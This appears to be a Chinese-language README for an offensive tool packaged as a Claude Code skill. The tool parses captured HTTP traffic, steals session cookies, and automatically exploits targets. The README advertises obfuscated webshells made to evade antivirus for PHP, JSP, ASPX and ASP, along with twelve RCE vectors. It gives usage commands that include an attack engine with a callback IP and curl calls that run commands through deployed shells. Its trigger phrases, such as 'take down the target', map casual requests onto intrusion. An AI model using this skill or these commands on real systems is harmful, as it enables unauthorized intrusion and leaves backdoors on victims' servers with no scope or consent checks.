# loginin-api-scanner v3.2

AI驱动的安全分析框架（被动扫描 + 主动探索 + 真实攻击） — Claude Code Skill

## 功能

- **被动扫描**: 解析 BurpSuite/HAR/Yakit 流量，自动识别 Critical/High 漏洞
- **主动探索**: 无漏洞时自动提取 Cookie/Session，以已认证身份深入后台
- **真实攻击**: 发现漏洞后部署 Webshell、执行 RCE、获取目标权限
- **AI 驱动**: 四种武器混合使用（curl 浏览 / 爬虫批量 / Selenium 渲染 / JS 逆向）
- **免杀 Webshell**: 内置混淆 cmd 型 Webshell（PHP/JSP/ASPX/ASP/Python/WAR），蚁剑兼容
- **12 种 RCE 向量**: 命令注入 / SSTI / SQL→RCE / LFI+LogPoisoning / XXE / 反序列化 / HTTP PUT / 任意文件写入 / 文件上传 / 主题上传

## 快速开始

```bash
# 依赖
pip install requests beautifulsoup4

# 可选
pip install playwright && playwright install chromium

# 安装
git clone https://github.com/YOUR_USERNAME/loginin-api-scanner.git
cp -r loginin-api-scanner ~/.claude/skills/
```

## 使用

```bash
# 1. 解析 Burp 流量
python3 scripts/parse_http.py burp_export.xml -o /tmp/parsed.json

# 2. 提取凭据
python3 scripts/extract_session.py /tmp/parsed.json -o /tmp/session.json

# 3. 主动爬取 + 攻击
python3 scripts/active_explorer.py /tmp/session.json -o /tmp/discovered.json --attack-mode

# 4. 攻击引擎
python3 scripts/core_engine.py /tmp/session.json /tmp/discovered.json --callback-ip 10.0.0.1

# 5. Shell 管理
python3 scripts/session_manager.py interactive /tmp/attack_results.json

# 6. 报告
python3 scripts/format_report.py /tmp/findings.json -o /tmp/report.md
```

## Webshell

所有内置 Webshell 统一 `?cmd=whoami` 格式，混淆免杀：

| 语言 | 使用 | 蚁剑 |
|------|------|:---:|
| PHP | `curl "http://target/shell.php?cmd=id"` | ✅ |
| JSP | `curl "http://target/shell.jsp?cmd=id"` | ✅ |
| ASPX | `curl "http://target/shell.aspx?cmd=whoami"` | ✅ |
| ASP | `curl "http://target/shell.asp?cmd=whoami"` | ✅ |

## 触发关键词

- "帮我分析数据包" / "审计HTTP流量" / "被动扫描"
- "主动探测后台" / "深入分析" / "深度扫描"
- "拿下目标" / "获取权限"

## 许可

Apache 2.0 — [LICENSE](LICENSE)
